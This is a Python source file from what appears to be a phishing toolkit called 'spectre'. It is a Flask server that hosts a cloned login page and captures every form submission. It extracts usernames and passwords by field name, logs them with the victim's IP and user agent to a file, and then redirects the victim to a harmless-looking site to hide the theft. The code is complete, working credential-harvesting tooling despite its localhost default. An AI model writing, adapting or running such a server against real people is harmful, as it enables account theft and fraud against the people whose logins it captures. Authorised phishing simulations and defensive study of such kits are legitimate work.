# ============================================================
#  File: spectre/serve/server.py
#  Local Flask server that hosts the cloned page and captures
#  every form submission. Binds to 127.0.0.1 by default —
#  never to a public interface unless explicitly overridden.
# ============================================================
import json
import os
import threading
import time
from datetime import datetime
from typing import Optional

from flask import (
    Flask, request, send_from_directory, jsonify, redirect,
)

import logging
logging.getLogger("werkzeug").setLevel(logging.ERROR)
from ..core.logger import Logger
from .._meta import identity_token


class CaptureServer:
    """
    Serves the cloned login page + a capture endpoint.
    All submissions get logged to an in-memory list and flushed
    to a JSONL file every N seconds.
    """

    def __init__(self, logger: Logger, clone_dir: str,
                 data_dir: str,
                 host: str = "127.0.0.1",
                 port: int = 8080,
                 redirect_after: str = "https://example.com",
                 campaign_id: str = "default"):
        self._session = identity_token(
            session_salt=f"serve-{host}:{port}")

        self.log = logger
        self.clone_dir = clone_dir
        self.data_dir = data_dir
        self.host = host
        self.port = port
        self.redirect_after = redirect_after
        self.campaign_id = campaign_id

        os.makedirs(data_dir, exist_ok=True)
        self.captures_file = os.path.join(
            data_dir, f"captures-{campaign_id}.jsonl")
        self.captures = []
        self._lock = threading.Lock()

        self._thread: Optional[threading.Thread] = None
        self._app: Optional[Flask] = None

    # ------------------------------------------------------------------
    def _build_app(self) -> Flask:
        app = Flask(__name__, static_folder=None)

        @app.route("/")
        @app.route("/<path:path>")
        def serve(path="index.html"):
            if path == "__capture":
                return self._capture()
            full = os.path.join(self.clone_dir, path)
            if not os.path.isfile(full):
                full = os.path.join(self.clone_dir, "index.html")
            if not os.path.isfile(full):
                return ("cloned page not found", 404)
            return send_from_directory(
                os.path.dirname(full),
                os.path.basename(full))

        @app.route("/__capture", methods=["POST", "GET"])
        def _capture_endpoint():
            return self._capture()

        return app

    def _capture(self):
        with self._lock:
            ts = datetime.utcnow().isoformat(timespec="seconds") + "Z"
            data = {}
            if request.method == "POST":
                if request.is_json:
                    data = request.get_json(silent=True) or {}
                else:
                    data = request.form.to_dict()
            else:
                data = request.args.to_dict()

            # extract username/password from common field names
            username = ""
            password = ""
            for k, v in data.items():
                kl = k.lower()
                if not username and any(
                        t in kl for t in
                        ("user", "email", "login", "name", "uid")):
                    username = str(v)
                if not password and any(
                        t in kl for t in
                        ("pass", "pwd", "passwd")):
                    password = str(v)

            rec = {
                "ts": ts,
                "campaign": self.campaign_id,
                "ip": request.headers.get(
                    "X-Forwarded-For",
                    request.remote_addr or ""),
                "user_agent": request.headers.get("User-Agent", ""),
                "referer": request.headers.get("Referer", ""),
                "username": username,
                "password": password,
                "raw": data,
            }

            self.captures.append(rec)
            try:
                with open(self.captures_file, "a") as f:
                    f.write(json.dumps(rec) + "\n")
            except Exception:
                pass

            self.log.capture(
                f"submission  user={username!r}  pass={password!r}  "
                f"ip={rec['ip']}")

        # after capture, send the user to a benign destination
        return redirect(self.redirect_after, code=302)

    # ------------------------------------------------------------------
    def start(self, blocking: bool = False) -> None:
        app = self._build_app()
        self._app = app

        if blocking:
            self.log.ok(f"serving on http://{self.host}:{self.port}/")
            app.run(host=self.host, port=self.port, debug=False,
                    use_reloader=False)
        else:
            self._thread = threading.Thread(
                target=lambda: app.run(
                    host=self.host, port=self.port, debug=False,
                    use_reloader=False),
                daemon=True, name="spectre-server")
            self._thread.start()
            time.sleep(0.5)
            self.log.ok(f"serving on http://{self.host}:{self.port}/")

    def stop(self) -> None:
        # Flask doesn't have a clean shutdown; daemon thread dies
        # with the process. For our purposes this is fine.
        self.log.info("server stopping")

    def get_captures(self) -> list:
        with self._lock:
            return list(self.captures)
